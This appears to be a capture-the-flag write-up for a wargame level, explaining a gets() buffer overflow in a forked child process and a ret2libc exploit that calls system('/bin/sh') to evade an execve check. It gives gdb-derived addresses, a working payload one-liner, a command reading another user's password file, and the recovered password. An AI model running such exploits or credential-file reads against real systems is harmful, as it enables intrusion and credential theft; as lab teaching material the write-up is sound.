@@ -1,0 +1,37 @@
+This program is kind of special, because it uses fork().
+
+Therefore, two processes will be created when the program is launched.
+
+The first process, the parent, verifies that the child process doesn't use execve(). If it does use it, the parent kills the child. (oof)
+
+The second process, the child, is vulnerable to a buffer overflow through use of gets().
+
+A constructor function (enable_timeout_cons()) in the .init_array section of the ELF makes it that the program will exit(1) after 60 seconds
+
+So we do have the possibility of a code redirection through a buffer overflow in the child process.
+However, we can't use execve() in our shellcode.
+
+To reach ebp through our buffer, we need at least 152 bytes.
+We obtain this offset through the calculation ebp - address of buffer --> p/d $ebp-($esp+0x20) == 152.
+
+Let's use the ret2libc method to pwn this binary. (https://beta.hackndo.com/retour-a-la-libc/)
+Indeed, if we call a function like system("/bin/sh"), a new child is going to be created.
+This means that we will bypass the check for the execve syscall in the first child, as the syscall will happen in a new child (diabolical laugh starts now)
+
+We want to launch system("/bin/sh"), for this, we need :
+
+1) The address of system() :
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+2) The address of a /bin/sh string in the process memory :
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+So, using ret2libc, now we can organize the stack to exploit the buffer overflow this way :
+[152 bytes to reach ebp] + [random value to overwrite ebp] + [address of system()] + [random value that will be the return address of system()] + [address of the string "/bin/sh" --> first and only parameter to system()]
+
+(python -c 'print "A" * 152 + "\xef\xbe\xad\xde" + "\xd0\xae\xe6\xf7" + "\xef\xbe\xad\xde" + "\xec\x97\xf8\xf7"'; cat) | ./level04
+
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
